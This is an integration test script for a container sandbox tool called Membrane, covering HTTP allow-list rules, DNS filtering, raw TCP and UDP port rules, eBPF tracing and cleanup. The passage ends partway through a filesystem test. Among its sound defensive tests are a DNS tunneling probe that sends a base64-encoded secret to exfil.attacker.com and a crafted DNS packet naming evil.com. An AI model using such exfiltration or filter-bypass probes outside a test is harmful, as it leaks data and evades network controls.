#!/usr/bin/env python3
"""Integration tests against real Docker/Sysbox. Use --list to find a group."""

import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from contextlib import ExitStack
from dataclasses import dataclass, field
import gzip
import json
import os
from pathlib import Path
import pty
import re
import shlex
import shutil
import signal
import socket
import subprocess
import sys
import tempfile
import termios
import time
import traceback
from typing import Callable

REPO_ROOT = Path(__file__).resolve().parent.parent


class TestFailure(Exception):
    pass


@dataclass
class Context:
    number: int
    membrane_cmd: str
    workdir: Path
    environment: dict
    output: list = field(default_factory=list)
    invocation: int = 0
    last_command: str = ""


def check(ctx, condition, description):
    if not condition:
        raise TestFailure(description + "\n" + ctx.last_command)
    ctx.output.append("PASS " + description)


def command_details(args, expected, actual, stdout, stderr):
    return (f"$ {shlex.join(map(str, args))}\n"
            f"expected exit: {expected}; actual exit: {actual}\n"
            f"stdout:\n{stdout}\nstderr:\n{stderr}")


def start_process(args, *, detach=False, **kwargs):
    if detach or sys.platform != "linux":
        return subprocess.Popen(args, start_new_session=True, **kwargs)
    # Keep the native host's controlling terminal and sudo timestamp, but give
    # each command its own process group for timeout cleanup. A small exec
    # wrapper supports Python 3.10 without preexec_fn in our threaded runner.
    return subprocess.Popen([sys.executable, "-c",
                             "import os, sys; os.setpgrp(); os.execvp(sys.argv[1], sys.argv[1:])",
                             *args], **kwargs)


def run(ctx, args, *, cwd=None, env=None, input=None, timeout=120, expected=0):
    """Capture every command; expected=None leaves status checks to the caller."""
    cwd = cwd if cwd is not None else ctx.workdir
    env = env if env is not None else (ctx.environment if ctx else None)
    actual, stdout, stderr = "not started", "", ""
    problem = None
    try:
        with start_process(args, detach=ctx is None, cwd=cwd, env=env, text=True,
                           stdin=subprocess.PIPE if input is not None else subprocess.DEVNULL,
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE) as process:
            try:
                stdout, stderr = process.communicate(input, timeout=timeout)
            except subprocess.TimeoutExpired:
                # Give Membrane and its children time to clean up on SIGTERM.
                try:
                    os.killpg(process.pid, signal.SIGTERM)
                except ProcessLookupError:
                    pass
                try:
                    stdout, stderr = process.communicate(timeout=20)
                except subprocess.TimeoutExpired:
                    try:
                        os.killpg(process.pid, signal.SIGKILL)
                    except ProcessLookupError:
                        pass
                    stdout, stderr = process.communicate()
                problem = f"timed out after {timeout}s"
            actual = process.returncode
    except OSError as error:
        problem = str(error)
    details = command_details(args, expected if expected is not None else "any", actual, stdout, stderr)
    if ctx:
        ctx.last_command = details
        with (ctx.workdir / "commands.log").open("a") as log:
            log.write(f"cwd: {cwd}\n{details}\n\n")
    if problem or (expected is not None and actual != expected):
        label = f"group {ctx.number:02}" if ctx else "warmup"
        raise TestFailure(f"{label}: {problem or 'unexpected exit status'}\n{details}")
    return subprocess.CompletedProcess(args, actual, stdout, stderr)


def membrane(ctx, command, *, options=(), **kwargs):
    """Run an ordinary non-tracing workload and retain its session ID for logs."""
    ctx.invocation += 1
    return run(ctx, [ctx.membrane_cmd, "--no-update", "--no-trace", "--no-global-config",
                     f"--session-id-file={ctx.workdir / f'session-id-{ctx.invocation}'}",
                     *options, "--", *command], **kwargs)


def config(ctx, contents):
    (ctx.workdir / ".membrane.yaml").write_text(contents)


def http(ctx, description, expected, url, *, method="GET", options=(), curl_options=()):
    command = ["curl", "-svL", "-m", "5"]
    if method != "GET":
        command += ["-X", method]
    # As in the old tests, examine the first verbose HTTP response, even if
    # curl later fails while following a redirect. "HTTP" means any response.
    result = membrane(ctx, [*command, *curl_options, url], options=options, expected=None)
    response = next((line.strip() for line in (result.stdout + result.stderr).splitlines()
                     if "< HTTP" in line), "")
    check(ctx, expected in response, f"{description} (expected {expected}, got {response!r})")


def exit_status(ctx, description, expected, command, *, options=()):
    membrane(ctx, command, options=options, expected=expected)
    check(ctx, True, f"{description} (exit {expected})")


def dns(ctx, description, expected, command):
    result = membrane(ctx, command)
    match = re.search(r"status: ([A-Z]+)", result.stdout)
    status = match.group(1) if match else "no DNS status"
    check(ctx, status == expected, f"{description} (expected {expected}, got {status})")


def group_1(ctx):
    config(ctx, """allow:
  - httpbin.org
""")
    http(ctx, '1A plain hostname GET / passthrough', '200',
         'https://httpbin.org/anything/root')
    http(ctx, '1B plain hostname POST / passthrough (origin decides)', 'HTTP',
         'https://httpbin.org/anything/root', method='POST')


def group_2(ctx):
    config(ctx, """allow:
  - dest: https://httpbin.org/anything/posts
""")
    http(ctx, '2A bare URL entry GET /anything/posts/ allowed', '200',
         'https://httpbin.org/anything/posts/')
    http(ctx, '2B bare URL entry GET / blocked', '403',
         'https://httpbin.org/')
    http(ctx, '2C bare URL entry POST /anything/posts/ allowed (no method constraint)', 'HTTP',
         'https://httpbin.org/anything/posts/', method='POST')


def group_3(ctx):
    config(ctx, """allow:
  - dest: https://httpbin.org
    http:
      - methods: [GET]
""")
    http(ctx, '3A method constraint GET / allowed', '200',
         'https://httpbin.org/anything/root')
    http(ctx, '3B method constraint POST / blocked', '403',
         'https://httpbin.org/anything/root', method='POST')


def group_4(ctx):
    config(ctx, """allow:
  - dest: https://httpbin.org/anything/posts
    http:
      - methods: [GET]
""")
    http(ctx, '4A method+url_path GET /anything/posts/ allowed', '200',
         'https://httpbin.org/anything/posts/')
    http(ctx, '4B method+url_path GET /anything/posts/on-the-money/ allowed', '200',
         'https://httpbin.org/anything/posts/on-the-money/')
    http(ctx, '4C method+url_path POST /anything/posts/ blocked (wrong method)', '403',
         'https://httpbin.org/anything/posts/', method='POST')
    http(ctx, '4D method+url_path GET / blocked (outside url_path)', '403',
         'https://httpbin.org/')


def group_5(ctx):
    config(ctx, """allow:
  - dest: https://httpbin.org
    http:
      - methods: [GET]
        paths:
          - /anything/posts
""")
    http(ctx, '5A absolute path GET /anything/posts/ allowed', '200',
         'https://httpbin.org/anything/posts/')
    http(ctx, '5B absolute path GET / blocked', '403',
         'https://httpbin.org/')
    http(ctx, '5C absolute path POST /anything/posts/ blocked (wrong method)', '403',
         'https://httpbin.org/anything/posts/', method='POST')


def group_6(ctx):
    config(ctx, """allow:
  - dest: https://httpbin.org/anything/posts
    http:
      - methods: [GET]
        paths:
          - on-the-money
""")
    http(ctx, '6A relative path GET /anything/posts/on-the-money/ allowed', '200',
         'https://httpbin.org/anything/posts/on-the-money/')
    http(ctx, '6B relative path GET / blocked (outside dest path)', '403',
         'https://httpbin.org/')


def group_7(ctx):
    config(ctx, """allow:
  - dest: https://httpbin.org
    http:
      - methods: [GET]
        paths:
          - /anything/posts
      - methods: [GET]
        paths:
          - /anything/about
      - methods: [GET, POST]
        paths:
          - /anything/edit
          - /anything/update
""")
    http(ctx, '7A multiple rules GET /anything/posts/ allowed (rule 1)', '200',
         'https://httpbin.org/anything/posts/')
    http(ctx, '7B multiple rules GET /anything/about allowed (rule 2)', '200',
         'https://httpbin.org/anything/about')
    http(ctx, '7C multiple rules GET / blocked (no rule matches)', '403',
         'https://httpbin.org/')
    http(ctx, '7D multiple rules POST /anything/posts/ blocked (wrong method)', '403',
         'https://httpbin.org/anything/posts/', method='POST')
    for method in ('GET', 'POST'):
        for path in ('/anything/edit', '/anything/update'):
            http(ctx, f'7E multiple methods/paths {method} {path} allowed', '200',
                 'https://httpbin.org' + path, method=method)
    http(ctx, '7F multiple methods/paths PUT blocked (wrong method)', '403',
         'https://httpbin.org/anything/edit', method='PUT')


def group_8(ctx):
    config(ctx, """allow:
  - dest: https://httpbin.org/anything/posts
  - dest: https://httpbin.org/anything/about
""")
    http(ctx, '8A multiple entries GET /anything/posts/ allowed', '200',
         'https://httpbin.org/anything/posts/')
    http(ctx, '8B multiple entries GET /anything/about allowed', '200',
         'https://httpbin.org/anything/about')
    http(ctx, '8C multiple entries GET / blocked', '403',
         'https://httpbin.org/')


def group_9(ctx):
    config(ctx, "")
    exit_status(ctx, '9A host not in allow list fails', 6,
                ['curl', '-sf', '-m', '5', 'https://example.com'])


def group_10(ctx):
    http(ctx, '10A CLI bare URL GET /anything/posts/ allowed', '200',
         'https://httpbin.org/anything/posts/', options=['--allow=https://httpbin.org/anything/posts'])
    http(ctx, '10B CLI bare URL GET / blocked', '403',
         'https://httpbin.org/', options=['--allow=https://httpbin.org/anything/posts'])
    http(ctx, '10C CLI plain hostname GET / passthrough', '200',
         'https://httpbin.org/anything/root', options=['--allow=httpbin.org'])


def group_11(ctx):
    config(ctx, """allow:
  - github.com
""")
    dns(ctx, '11A DNS allowed domain resolves', 'NOERROR', ['dig', 'github.com'])
    dns(ctx, '11B DNS blocked domain gets NXDOMAIN', 'NXDOMAIN', ['dig', 'google.com'])
    # c2VjcmV0Cg== is base64("secret\n"), the old tunneling payload.
    dns(ctx, '11C DNS tunneling attempt gets NXDOMAIN', 'NXDOMAIN', ['dig', 'c2VjcmV0Cg==.exfil.attacker.com'])
    exit_status(ctx, '11D DNS direct resolver bypass blocked', 9,
                ['dig', '@8.8.8.8', 'github.com'], options=['--allow=github.com'])


def group_12(ctx):
    for trailing_slash in ('', '/'):
        prefix = '/anything/v1' + trailing_slash
        for name, rule, restricted in (
            ('absolute', f"""  - dest: https://httpbin.org
    http:
      - methods: [GET]
        paths: [{prefix}]
""", True),
            ('relative', f"""  - dest: https://httpbin.org/anything{trailing_slash}
    http:
      - methods: [GET]
        paths: [v1{trailing_slash}]
""", True),
            ('URL-only', f"  - dest: https://httpbin.org{prefix}\n", False),
            ('URL with methods', f"""  - dest: https://httpbin.org{prefix}
    http:
      - methods: [GET]
""", True),
            # An explicit empty list exercises the addon's no-HTTP-rules branch.
            ('URL without HTTP constraints', f"""  - dest: https://httpbin.org{prefix}
    http: []
""", False),
        ):
            config(ctx, 'allow:\n' + rule)
            for path, expected in (
                ('/anything/v1', '200'),
                ('/anything/v1/', '200'),
                ('/anything/v1/models', '200'),
                ('/anything/v10', '403'),
                ('/anything/v1extra', '403'),
                ('/anything/v1-evil', '403'),
            ):
                http(ctx, f'12 {name} prefix {prefix!r} GET {path}', expected,
                     'https://httpbin.org' + path)
            http(ctx, f'12 {name} prefix {prefix!r} POST method check',
                 '403' if restricted else '200',
                 'https://httpbin.org/anything/v1/', method='POST')

    for constraints in ('http: [{methods: [GET], paths: [/]}]',
                        'http: [{methods: [GET]}]', 'http: []'):
        config(ctx, f'allow:\n  - dest: https://httpbin.org/\n    {constraints}\n')
        for path in ('/', '/anything/root', '/anything/root/'):
            http(ctx, f'12 root prefix with {constraints} GET {path}', '200',
                 'https://httpbin.org' + path)


def group_13(ctx):
    config(ctx, """allow:
  - dest: httpbin.org
    http:
      - methods: [GET]
        paths:
          - /anything/posts
""")
    http(ctx, '13A host-type http rules GET /anything/posts/ allowed', '200',
         'https://httpbin.org/anything/posts/')
    http(ctx, '13B host-type http rules GET / blocked', '403',
         'https://httpbin.org/')
    http(ctx, '13C host-type http rules POST /anything/posts/ blocked', '403',
         'https://httpbin.org/anything/posts/', method='POST')


def group_14(ctx):
    filesystem_case(ctx, sealed=True)


def group_15(ctx):
    ip = socket.gethostbyname('httpbin.org')
    config(ctx, f"""allow:
  - dest: {ip}
    http:
      - methods: [GET]
        paths:
          - /anything/posts
""")
    http(ctx, '15A CIDR http rules GET /anything/posts/ allowed', '200',
         'https://httpbin.org/anything/posts/', curl_options=['--resolve', f'httpbin.org:443:{ip}'])
    http(ctx, '15B CIDR http rules GET / blocked', '403',
         'https://httpbin.org/', curl_options=['--resolve', f'httpbin.org:443:{ip}'])
    http(ctx, '15C CIDR http rules POST /anything/posts/ blocked (wrong method)', '403',
         'https://httpbin.org/anything/posts/', method='POST', curl_options=['--resolve', f'httpbin.org:443:{ip}'])


def group_16(ctx):
    config(ctx, "allow:\n  - github.com\n")
    result = membrane(ctx, ["python3", "-c", r'''
import socket, struct, subprocess
routes = subprocess.check_output(["ip", "route"]).decode()
gateway = next(line.split()[2] for line in routes.splitlines() if "default" in line)
names = ["github.com", "evil.com"]
packet = struct.pack("!HHHHHH", 0x1234, 0x0100, len(names), 0, 0, 0)
for name in names:
    for part in name.split("."):
        packet += bytes([len(part)]) + part.encode()
    packet += b"\x00" + struct.pack("!HH", 1, 1)
with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
    sock.settimeout(3)
    sock.sendto(packet, (gateway, 53))
    response, _ = sock.recvfrom(512)
print("RCODE", response[3] & 0x0F)
'''])
    check(ctx, "RCODE 3" in result.stdout,
          "16A multi-question DNS packet blocked (NXDOMAIN)")


def group_17(ctx):
    config(ctx, """allow:
  - 8.8.8.8
""")
    exit_status(ctx, '17A UDP blocked by default to allowed IP', 9,
                ['dig', '@8.8.8.8', 'github.com'])
    http(ctx, '17B TCP still works to allowed IP', 'HTTP',
         'https://8.8.8.8/')
    config(ctx, """allow:
  - dest: 8.8.8.8
    ports: [53/udp]
""")
    exit_status(ctx, '17C UDP opt-in allows DNS', 0,
                ['dig', '@8.8.8.8', 'github.com'])


def group_18(ctx):
    config(ctx, """allow:
  - dest: https://httpbin.org
    http:
      - methods: [GET]
        paths:
          - /anything/posts
""")
    http(ctx, '18A dot-segment traversal blocked', '403',
         'https://httpbin.org/anything/posts/../', curl_options=['--path-as-is'])
    http(ctx, '18B double dot-segment blocked', '403',
         'https://httpbin.org/anything/posts/on-the-money/../../', curl_options=['--path-as-is'])
    http(ctx, '18C percent-encoded traversal outside allowed path blocked', '403',
         'https://httpbin.org/anything/posts/%2e%2e/', curl_options=['--path-as-is'])
    http(ctx, '18D double-encoded traversal outside allowed path blocked', '403',
         'https://httpbin.org/anything/posts/%252e%252e/', curl_options=['--path-as-is'])
    http(ctx, '18E normal path still allowed', '200',
         'https://httpbin.org/anything/posts/')


def group_19(ctx):
    config(ctx, """allow:
  - dest: github.com
    http:
      - methods: [GET]
        paths:
          - /
""")
    exit_status(ctx, '19A raw TCP blocked to host with http-only rules', 1,
                ["bash", "-c", 'sleep 3 | ncat -w3 github.com 22 2>&1 | grep -q SSH'])
    config(ctx, """allow:
  - github.com
""")
    exit_status(ctx, '19B raw TCP allowed to plain hostname', 0,
                ["bash", "-c", 'sleep 3 | ncat -w3 github.com 22 2>&1 | grep -q SSH'])
    config(ctx, """allow:
  - dest: github.com
    http:
      - methods: [GET]
        paths:
          - /
  - dest: github.com
    ports: [22/tcp]
""")
    exit_status(ctx, '19C raw TCP allowed on explicitly permitted port alongside http rules', 0,
                ["bash", "-c", 'sleep 3 | ncat -w3 github.com 22 2>&1 | grep -q SSH'])


def group_20(ctx):
    config(ctx, """allow:
  - dest: https://httpbin.org/anything/posts
    http:
      - methods: [GET]
        paths:
          - on-the-money
""")
    http(ctx, '20A URL+http GET /anything/posts/on-the-money/ allowed', '200',
         'https://httpbin.org/anything/posts/on-the-money/')
    http(ctx, '20B URL+http GET /anything/posts/ blocked (outside path constraint)', '403',
         'https://httpbin.org/anything/posts/')
    http(ctx, '20C URL+http POST /anything/posts/on-the-money/ blocked (wrong method)', '403',
         'https://httpbin.org/anything/posts/on-the-money/', method='POST')
    http(ctx, '20D URL+http GET / blocked (outside url prefix)', '403',
         'https://httpbin.org/')


def group_21(ctx):
    ip = socket.gethostbyname('github.com')
    config(ctx, f"""allow:
  - dest: {ip}
    http:
      - methods: [GET]
        paths:
          - /
""")
    exit_status(ctx, '21A CIDR http-only rules block raw TCP', 1,
                ["bash", "-c", f'sleep 3 | ncat -w3 {ip} 22 2>&1 | grep -q SSH'])
    http(ctx, '21B CIDR http rules still allow HTTP', '200',
         'https://github.com/', curl_options=['--resolve', f'github.com:443:{ip}'])


def group_22(ctx):
    config(ctx, """allow:
  - dest: portquiz.takao-tech.com
    http:
      - methods: [GET]
        paths:
          - /allowed
""")
    http(ctx, '22A http rules enforced on non-standard port 8443', '403',
         'https://portquiz.takao-tech.com:8443/')
    http(ctx, '22B http rules allow correct path on non-standard port 8443', 'HTTP',
         'https://portquiz.takao-tech.com:8443/allowed/')


def group_23(ctx):
    config(ctx, """allow:
  - "*.httpbin.org"
""")
    exit_status(ctx, '23A host pattern *.httpbin.org blocks apex httpbin.org', 6,
                ['curl', '-sf', '-m', '5', 'https://httpbin.org/'])
    config(ctx, """allow:
  - "*.github.com"
""")
    http(ctx, '23B host pattern *.github.com allows api.github.com', '200',
         'https://api.github.com/')
    exit_status(ctx, '23C host pattern *.github.com blocks apex github.com', 6,
                ['curl', '-sf', '-m', '5', 'https://github.com/'])


def group_24(ctx):
    config(ctx, """allow:
  - "*"
""")
    http(ctx, '24A bare * allows arbitrary host', '200',
         'https://httpbin.org/anything/root')
    http(ctx, '24B bare * allows another arbitrary host', '200',
         'https://api.github.com/')
    config(ctx, """allow:
  - dest: "*"
    ports: [443/tcp]
""")
    exit_status(ctx, '24C bare * with ports:[443/tcp] blocks SSH port 22', 1,
                ["bash", "-c", 'sleep 3 | ncat -w3 github.com 22 2>&1 | grep -q SSH'])
    http(ctx, '24D bare * with ports:[443/tcp] allows HTTPS', '200',
         'https://httpbin.org/anything/root')

class Session:
    """A live workload with file readiness gates, optional terminal, and cleanup.

    Prepare directory first, then use with Session(...) (or ExitStack) so every
    started process is stopped even when a host-side assertion fails.
    """

    def __init__(self, ctx, directory, command, *, options=(), env=None, terminal=False):
        self.ctx, self.directory = ctx, directory
        self.idfile = directory / "session-id"
        self.args = [ctx.membrane_cmd, "--no-update", "--no-global-config",
                     f"--session-id-file={self.idfile}", *options, "--", *command]
        self.env = env if env is not None else ctx.environment
        self.use_terminal = terminal
        self.terminal = None
        self.terminal_state = None
        self.process = None
        self.log = None

    def __enter__(self):
        try:
            self.log = (self.directory / "output.log").open("w")
            if self.use_terminal:
                self.terminal = pty.openpty()
                self.terminal_state = termios.tcgetattr(self.terminal[1])
            self.process = start_process(
                self.args, cwd=self.directory, env=self.env,
                stdin=self.terminal[1] if self.terminal else subprocess.DEVNULL,
                stdout=self.log, stderr=self.log)
        except OSError as error:
            self.close()
            raise TestFailure(f"group {self.ctx.number}: {error}\n" + command_details(
                self.args, "started", "not started", "", "")) from error
        return self

    def __exit__(self, *_):
        self.close()

    @property
    def id(self):
        return self.idfile.read_text().strip()

    def output(self):
        return (self.directory / "output.log").read_text()

    def details(self, expected):
        return command_details(self.args, expected, self.process.poll(),
                               self.output(), "(merged into stdout)")

    def wait_for(self, marker, timeout=90):
        deadline = time.monotonic() + timeout
        while not (self.directory / marker).exists():
            if self.process.poll() is not None or time.monotonic() > deadline:
                raise TestFailure(f"group {self.ctx.number}: session did not reach {marker}\n"
                                  + self.details("running until ready"))
            time.sleep(0.1)

    def release(self, marker="continue"):
        (self.directory / marker).touch()

    def wait(self, expected=0, timeout=90):
        try:
            code = self.process.wait(timeout=timeout)
        except subprocess.TimeoutExpired:
            raise TestFailure(f"group {self.ctx.number}: session timed out after {timeout}s\n"
                              + self.details(expected)) from None
        details = self.details(expected)
        self.ctx.last_command = details
        with (self.ctx.workdir / "commands.log").open("a") as log:
            log.write(details + "\n\n")
        if expected is not None and code != expected:
            raise TestFailure(f"group {self.ctx.number}: unexpected session exit\n" + details)
        if expected is not None:
            check(self.ctx, True, f"{self.directory.name}: exit {code}")
        return self.output()

    def close(self):
        try:
            if self.process is not None:
                try:
                    os.killpg(self.process.pid, signal.SIGTERM)
                except ProcessLookupError:
                    pass
                try:
                    self.process.wait(timeout=20)
                except subprocess.TimeoutExpired:
                    pass
                # Membrane gets the first chance to clean up; reap leftover CLI
                # children even if the leader has already exited.
                try:
                    os.killpg(self.process.pid, signal.SIGKILL)
                except ProcessLookupError:
                    pass
                self.process.wait()
        finally:
            if self.log is not None:
                self.log.close()
            if self.terminal:
                try:
                    if self.terminal_state is not None:
                        termios.tcsetattr(self.terminal[1], termios.TCSANOW, self.terminal_state)
                finally:
                    for fd in self.terminal:
                        os.close(fd)
                    self.terminal = None


def trace_events(ctx, path):
    # Reading to EOF verifies the gzip CRC/trailer and every JSONL record.
    with gzip.open(path, "rt") as stream:
        events = [json.loads(line) for line in stream]
    check(ctx, bool(events), "valid nonempty gzip JSONL: " + str(path))
    return events


def check_events(ctx, events, token, port, output, executable="./trace-workload"):
    check(ctx, any(e.get("type") == "process_exec" and e.get("argv", "").startswith(executable + " " + token + " ")
              for e in events), token + ": first exec")
    check(ctx, any(e.get("type") == "file_open" and e.get("path") == "/tmp/" + token + ".write"
              and e["flags"] & 3 in (1, 2)
              for e in events), token + ": immediate write-open")
    check(ctx, any(e.get("type") == "socket_connect" and e.get("daddr") == "198.51.100.7" and e.get("dport") == port
              for e in events), token + ": IPv4 connect")
    check(ctx, any(e.get("type") == "socket_connect" and e.get("family") == 2
              and e.get("daddr") == "127.0.0.1" and e.get("dport") == port + 10
              for e in events), token + ": IPv4 loopback connect")
    if "IPV6 " + token + " true" in output:
        check(ctx, any(e.get("type") == "socket_connect" and e.get("daddr") == "2001:db8::7" and e.get("dport") == port
                  for e in events), token + ": IPv6 connect")
        check(ctx, all(any(e.get("type") == "socket_connect" and e.get("family") == 10
                      and e.get("daddr") == addr and e.get("dport") == port + 10
                      for e in events) for addr in ("::1", "127.0.0.1")),
              token + ": IPv6 loopback and mapped-loopback connects")
    else:
        check(ctx, "IPV6 " + token + " false" in output, token + ": IPv6 availability reported")
        ctx.output.append("SKIP " + token + ": kernel cannot create IPv6 sockets")


def inspect(ctx, name):
    return json.loads(run(ctx, ["docker", "inspect", name]).stdout)[0]


def check_handler(ctx, session, traced=True, policy=False):
    data = inspect(ctx, "membrane-handler-" + session.id)
    cfg = data["HostConfig"]
    caps = {c.removeprefix("CAP_") for c in cfg.get("CapAdd") or []}
    expected = {"NET_ADMIN", "BPF", "PERFMON"} if traced or policy else {"NET_ADMIN"}
    check(ctx, caps == expected and not cfg["Privileged"] and cfg["PidMode"] != "host"
          and cfg["CgroupnsMode"] == "private", "handler capabilities and namespaces")
    mounts = {m["Destination"]: m for m in data["Mounts"]}
    check(ctx, "/sys/fs/cgroup" not in mounts
          and ("/sys/kernel/tracing" in mounts) == traced
          and (not traced or not mounts["/sys/kernel/tracing"]["RW"])
          and ("/trace" in mounts) == traced, "tracing mounts match --no-trace setting")
    parent = inspect(ctx, "membrane-agent-" + session.id)["HostConfig"]["CgroupParent"]
    check(ctx, mounts["/workload-cgroup"]["Source"] == "/sys/fs/cgroup/" + parent.lstrip("/")
          and mounts["/workload-cgroup"]["RW"]
          and "MEMBRANE_TARGET_CGROUP=/workload-cgroup" in data["Config"]["Env"],
          "handler control is scoped to its workload cgroup")
    check(ctx, "/policy-pins" not in mounts and "/sys/fs/bpf" not in mounts,
          "no bpffs or policy pin mount")
    if policy:
        roots = [m for path, m in mounts.items() if path.startswith("/policy-roots/")]
        check(ctx, "/sys/kernel/security" not in mounts
              and roots and all(not m["RW"] for m in roots)
              and "/etc/membrane/policy.json" in mounts and not mounts["/etc/membrane/policy.json"]["RW"],
              "trusted enrollment mounts")
    return data


def cleaned(ctx, session):
    host_prefix = ["colima", "ssh", "--profile", "membrane", "--"] if sys.platform == "darwin" else []
    resources = (("container", "agent"), ("container", "handler"), ("network", "internal"),
                 ("network", "external"), ("volume", "ca"))
    check(ctx, all(run(ctx, ["docker", kind, "inspect", "membrane-" + name + "-" + session.id], expected=None).returncode != 0
              for kind, name in resources), session.directory.name + ": session Docker resources removed")
    check(ctx, all(run(ctx, [*host_prefix, "test", "!", "-d", path], expected=None).returncode == 0 for path in
              ("/sys/fs/cgroup/membrane-" + session.id, "/sys/fs/cgroup/membrane" + session.id + ".slice")),
          session.directory.name + ": session parent removed")
    prefix = [*host_prefix, "sudo", "-n"] if sys.platform == "darwin" or os.geteuid() != 0 else []
    check(ctx, run(ctx, [*prefix, "test", "!", "-d", "/sys/fs/bpf/membrane/" + session.id], expected=None).returncode == 0,
          session.directory.name + ": no policy pin directory created")


def build_trace_workload(ctx):
    info = json.loads(run(ctx, ["docker", "info", "--format", "{{json .}}"]).stdout)
    check(ctx, "sysbox-runc" in info["Runtimes"], "Sysbox runtime available")
    ctx.output.append("ENV kernel=" + info["KernelVersion"] + " driver=" + info["CgroupDriver"] + " cgroup=" + info["CgroupVersion"])
    arch = {"aarch64": "arm64", "x86_64": "amd64"}.get(info["Architecture"], info["Architecture"])
    run(ctx, ["go", "build", "-buildvcs=false", "-o", str(ctx.workdir / "trace-workload"),
              str(REPO_ROOT / "scripts/testdata/trace-workload.go")],
        env=dict(ctx.environment, CGO_ENABLED="0", GOOS="linux", GOARCH=arch))


def trace_docker_env(ctx):
    # Pass through to real Docker. Hold one start to inspect pre-workload state;
    # separately remove tracing capabilities to exercise a real loader failure.
    wrapper = ctx.workdir / "bin"
    wrapper.mkdir()
    shim = wrapper / "docker"
    shim.write_text(f'''#!{sys.executable}
import os, sys, time, subprocess
from pathlib import Path
args = sys.argv[1:]
artifacts = os.getenv("BPF_FAILURE_ARTIFACTS")
if artifacts and args[0] == "create":
    (Path(artifacts) / "agent-created").touch()
if artifacts and args[0] == "rm" and args[-1].startswith("membrane-handler-"):
    logs = subprocess.run([{shutil.which("docker")!r}, "logs", args[-1]], capture_output=True, text=True)
    (Path(artifacts) / "failed-handler.log").write_text(logs.stdout + logs.stderr)
if args[0] == "run" and "membrane-handler" in args and os.getenv("FAIL_BPF"):
    args = [a for a in args if a not in ("--cap-add=BPF", "--cap-add=PERFMON")]
if args[0] == "start" and os.getenv("CHECK_START"):
    gate = Path(os.environ["CHECK_START"])
    (gate / "before-start").touch()
    deadline = time.monotonic() + 90
    while not (gate / "start").exists():
        if time.monotonic() >= deadline:
            sys.exit("test start gate timed out")
        time.sleep(0.05)
os.execv({shutil.which("docker")!r}, ["docker"] + args)
''')
    shim.chmod(0o755)
    return dict(ctx.environment, PATH=str(wrapper) + os.pathsep + ctx.environment["PATH"])


def trace_session(ctx, token, port, *, traced=True, dind=False, env=None, terminal=False):
    directory = ctx.workdir / token
    directory.mkdir()
    shutil.copy2(ctx.workdir / "trace-workload", directory / "trace-workload")
    options = ["--trace-log=" + str(directory / "trace.jsonl.gz")]
    if not traced:
        options.append("--no-trace")
    command = ["./trace-workload", token, str(port), "tty" if terminal else "hold"]
    if dind:
        command.append("dind")
    return Session(ctx, directory, command, options=options, env=env, terminal=terminal)


def group_25(ctx):
    base = ctx.workdir
    host_prefix = ["colima", "ssh", "--profile", "membrane", "--"] if sys.platform == "darwin" else []
    build_trace_workload(ctx)
    env = trace_docker_env(ctx)
    with ExitStack() as sessions:
        a = sessions.enter_context(trace_session(
            ctx, "trace-a", 45101, dind=True, env=dict(env, CHECK_START=str(base / "trace-a"))))
        a.wait_for("before-start")
        agent, handler = inspect(ctx, "membrane-agent-" + a.id), check_handler(ctx, a)
        parent = agent["HostConfig"]["CgroupParent"]
        cgroup = "/sys/fs/cgroup/" + parent.lstrip("/")
        check(ctx, agent["State"]["Status"] == "created" and agent["State"]["Pid"] == 0
              and bool(parent) and handler["HostConfig"]["CgroupParent"] != parent
              and run(ctx, [*host_prefix, "test", "-d", cgroup], expected=None).returncode == 0, "session parent exists before workload, outside handler")
        check(ctx, "MEMBRANE_TARGET_CGROUP=/workload-cgroup" in handler["Config"]["Env"]
              and run(ctx, ["docker", "exec", "membrane-handler-" + a.id, "test", "-f", "/tmp/tracer-ready"], expected=None).returncode == 0,
              "BPF scoped and ready before docker start")
        a.release("start")
        a.wait_for("trace-a.first")
        pid = inspect(ctx, "membrane-agent-" + a.id)["State"]["Pid"]
        check(ctx, run(ctx, [*host_prefix, "cat", f"/proc/{pid}/cgroup"]).stdout.strip().startswith("0::/" + parent.lstrip("/") + "/"),
              "workload runs beneath pre-created parent")
        b = sessions.enter_context(trace_session(ctx, "trace-b", 45102))
        b.wait_for("trace-b.first")
        run(ctx, ["docker", "run", "--rm", "--network=none", "-v", str(base / "trace-workload") + ":/probe:ro",
               "--entrypoint=/probe", "membrane-agent", "trace-other", "45301"])
        a.release()
        output_a = a.wait()  # Keep B active through A's inner Docker workload.
        b.release()
        output_b = b.wait()
        events_a, events_b = trace_events(ctx, a.directory / "trace.jsonl.gz"), trace_events(ctx, b.directory / "trace.jsonl.gz")
        check_events(ctx, events_a, "trace-a", 45101, output_a)
        check_events(ctx, events_b, "trace-b", 45102, output_b)
        check(ctx, any(e.get("type") == "file_open" and e.get("path") == str(a.directory.resolve() / "trace-a.first")
                  for e in events_a), "workspace file opens use the canonical host path")
        check(ctx, any(e.get("type") == "file_open" and e.get("path") == "/etc/hostname"
                  and e["flags"] & 3 == 0 for e in events_a), "read-only file opens recorded")
        check(ctx, "trace-b" not in json.dumps(events_a) and "trace-a" not in json.dumps(events_b)
              and "trace-other" not in json.dumps(events_a + events_b), "concurrent sessions and unrelated container isolated")
        check(ctx, "DIND trace-a ok" in output_a, "inner Docker workload completed")
        check_events(ctx, events_a, "inner-trace-a", 45201, output_a, executable="/probe")
        cleaned(ctx, a)
        cleaned(ctx, b)


def group_26(ctx):
    filesystem_case(ctx, sealed=False)


def group_27(ctx):
    for path in ("config/settings.yaml", "config/secrets.txt", "sealed/readonly/child"):
        target = ctx.workdir / path
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text("fixture data\n")
    config(ctx, "readonly:\n  - config/\n  - sealed/readonly/\nsealed:\n  - config/secrets.txt\n  - sealed/\n")
    copy_policy_workload(ctx.workdir)
    result = membrane(ctx, ["sudo", "python3", "policy-workload.py", "precedence"])
    ctx.output.extend(line for line in result.stdout.splitlines() if line.startswith("PASS "))
    check(ctx, True, "27A overlapping rules start successfully; SEALED dominates READONLY")


def copy_policy_workload(directory):
    shutil.copy2(REPO_ROOT / "scripts/testdata/policy-workload.py", directory / "policy-workload.py")


def filesystem_case(ctx, sealed):
    build_trace_workload(ctx)
    base = ctx.workdir
    (base / "secrets/sub").mkdir(parents=True)
    for path, data in (("protected", "protected data\n"), ("secrets/api-key.txt", "api-key-value\n"),
                       ("ordinary", "ordinary\n"), ("replacement", "replacement\n")):
